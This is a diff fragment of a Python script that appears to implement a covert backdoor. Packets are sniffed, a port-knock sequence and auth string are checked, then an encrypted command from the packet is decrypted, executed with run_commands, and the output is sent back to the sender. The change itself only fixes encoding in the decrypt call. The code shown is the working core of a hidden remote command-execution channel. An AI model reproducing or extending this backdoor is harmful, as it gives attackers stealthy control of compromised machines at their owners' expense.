@@ -184,7 +184,7 @@ def process_sniff_pkt(pkt):
         if dst_port == port3 and auth_string == port_knock_auth:
             # print(f"Third knock valid")
             print(f"Data: {command}")
-            decrypt_cmd = encryption.decrypt(command)
+            decrypt_cmd = encryption.decrypt(command.encode('utf-8')).decode('utf-8')
             print(f"cmd: {decrypt_cmd}")
             result = run_commands(decrypt_cmd)
             send_command_output(result, address, sender_port)
